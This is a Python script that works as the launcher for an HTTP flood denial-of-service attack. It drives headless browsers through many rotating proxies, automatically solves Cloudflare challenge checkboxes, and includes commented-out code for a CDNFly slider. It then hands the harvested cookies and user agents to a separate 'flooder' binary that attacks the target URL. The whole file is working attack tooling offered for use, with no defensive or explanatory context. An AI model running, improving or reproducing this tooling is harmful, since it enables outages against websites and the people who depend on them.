import undetected_chromedriver as uc
import sys
import re
import subprocess
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.wait import WebDriverWait
from random import choice
from time import sleep
from concurrent.futures import ThreadPoolExecutor
def get_user_agent():
    return "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
def load_file(path):
    lines = open(path).readlines()
    return [line.strip() for line in lines]
def get_cookies(driver):
    cookies = driver.get_cookies()
    pieces = []
    for cookie in cookies:
        cookie_string = cookie["name"] + "=" + cookie["value"]
        pieces.append(cookie_string)
    return ";".join(pieces)
def start_flooder(target_url, proxy_address, user_agent, cookies):
    subprocess.Popen([
        "./flooder",
        target_url,
        "120",
        "64",
        "1",
        proxy_address,
        user_agent,
        cookies
    ], start_new_session=True)
def wait_for_load_event(driver, event, timeout, retries = 0):
    if retries == timeout:
        return Exception("timeout exceeded")
    try:
        sleep(1)
        state = driver.execute_script("return document.readyState")
        if state != "complete":
            wait_for_load_event(driver=driver, event=event, timeout=timeout, retries=retries + 1)
    except:
        wait_for_load_event(driver=driver, event=event, timeout=timeout, retries=retries + 1)
def wait_for_navigate(driver):
    wait_for_load_event(driver=driver, event="loading", timeout=30)
    wait_for_load_event(driver=driver, event="complete", timeout=30)
def wait_for_selector_visible(driver, selector, timeout):
    WebDriverWait(driver=driver, timeout=timeout, poll_frequency=1).until(
        lambda driver: driver.find_element("css selector", selector).is_displayed()
    )
def bypass_worker(target_url, proxy_address):
    user_agent = get_user_agent()
    options = uc.ChromeOptions()
    options.add_argument("--disable-features=Translate,OptimizationHints,MediaRouter")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-component-extensions-with-background-pages")
    options.add_argument("--disable-background-networking")
    options.add_argument("--disable-component-update")
    options.add_argument("--disable-client-side-phishing-detection")
    options.add_argument("--disable-sync")
    options.add_argument("--metrics-recording-only")
    options.add_argument("--disable-default-apps")
    options.add_argument("--mute-audio")
    options.add_argument("--no-default-browser-check")
    options.add_argument("--no-first-run")
    options.add_argument("--disable-backgrounding-occluded-windows")
    options.add_argument("--disable-renderer-backgrounding")
    options.add_argument("--disable-background-timer-throttling")
    options.add_argument("--disable-ipc-flooding-protection")
    options.add_argument("--password-store=basic")
    options.add_argument("--use-mock-keychain")
    options.add_argument("--force-fieldtrials=*BackgroundTracing/default/")
    options.add_argument("--allow-pre-commit-input")
    options.add_argument("--disable-breakpad")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-hang-monitor")
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-prompt-on-repost")
    options.add_argument("--disable-search-engine-choice-screen")
    options.add_argument("--enable-blink-features=IdleDetection")
    options.add_argument("--enable-features=NetworkServiceInProcess2")
    options.add_argument("--export-tagged-pdf")
    options.add_argument("--force-color-profile=srgb")
    options.add_argument("--disable-features=Translate,AcceptCHFrame,MediaRouter,OptimizationHints")
    options.add_argument("--test-type")
    options.add_argument("--renderer-process-limit=1")
    options.add_argument("--in-process-gpu")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-setuid-sandbox")
    options.add_argument("--no-zygote")
    options.add_argument("--no-sandbox")
    options.add_argument("--headless=new")
    options.add_argument("--user-agent=" + user_agent)
    options.add_argument("--proxy-server=http://" + proxy_address)
    driver = uc.Chrome(options=options, driver_executable_path="./chromedriver")
    try:
        driver.execute_script(f"window.open('{target_url}', '_blank');")
        sleep(30)
        driver.switch_to.window(
            window_name=driver.window_handles[0]
        )
        driver.close()
        driver.switch_to.window(
            window_name=driver.window_handles[0]
        )
        source = driver.page_source
        if "access denied" in driver.title.lower():
            print("IP " + proxy_address + " blocked by CloudFlare")
            driver.quit()
        if "challenge-platform" in source:
            CLOUDFLARE_CAPTCHA_SELECTOR = "iframe[src*='challenges']"
            CLOUDFLARE_CHECKBOX_SELECTOR = "input[type='checkbox']"
            print(proxy_address, "- Found CloudFlare challenge")
            wait_for_selector_visible(driver=driver, selector=CLOUDFLARE_CAPTCHA_SELECTOR, timeout=30)
            captcha_box = driver.find_element("css selector", CLOUDFLARE_CAPTCHA_SELECTOR)
            driver.switch_to.frame(captcha_box)
            sleep(15)
            captcha_checkbox = driver.find_element("css selector", CLOUDFLARE_CHECKBOX_SELECTOR)
            actions = ActionChains(driver=driver)
            actions.click(captcha_checkbox)
            actions.perform()
            driver.switch_to.default_content()
            wait_for_navigate(driver=driver)
            sleep(15)
        # CDNFly Beta.
        # elif "安全检查" in title:
        #     print(proxy_address, "- Found CDNFly challenge")
        #     CDNFLY_SLIDER_SELECTOR = "//div[@id='btn']"
        #     wait_for_selector_visible(driver=driver, selector=CDNFLY_SLIDER_SELECTOR, timeout=30)
        #     slider = driver.find_element("xpath", CDNFLY_SLIDER_SELECTOR)
        #     actions = ActionChains(driver=driver)
        #     actions.click_and_hold(slider)
        #     actions.move_by_offset(xoffset=300, yoffset=0)
        #     sleep(5)
        #     actions.release(slider)
        #     actions.perform()
        #     wait_for_navigate(driver=driver)
        else:
            sleep(15)
    except Exception as error:
        print("An error occurs when trying to bypass with", proxy_address)
    finally:
        cookies = get_cookies(driver=driver)
        final_title = driver.title
        driver.quit()
        if cookies.strip() == "":
            print(proxy_address, "- No cookies found")
            return
        else:
            print("Found title - ", final_title)
            print(proxy_address, "|", user_agent, "|", cookies)
            start_flooder(target_url=target_url, proxy_address=proxy_address, user_agent=user_agent, cookies=cookies)

def main():
    target_url = sys.argv[1]
    proxies_length = sys.argv[2]
    threads = sys.argv[3]
    proxies_file = sys.argv[4]
    all_proxies = load_file(proxies_file)
    proxies = []
    int_proxies_length = int(proxies_length)
    int_threads = int(threads)
    for i in range(int_proxies_length):
        proxy_address = choice(all_proxies)
        all_proxies.remove(proxy_address)
        proxies.append(proxy_address)
    with ThreadPoolExecutor(max_workers=int_threads) as executor:
        for proxy_address in proxies:
            executor.submit(bypass_worker, target_url, proxy_address)
if __name__ == "__main__":
    main()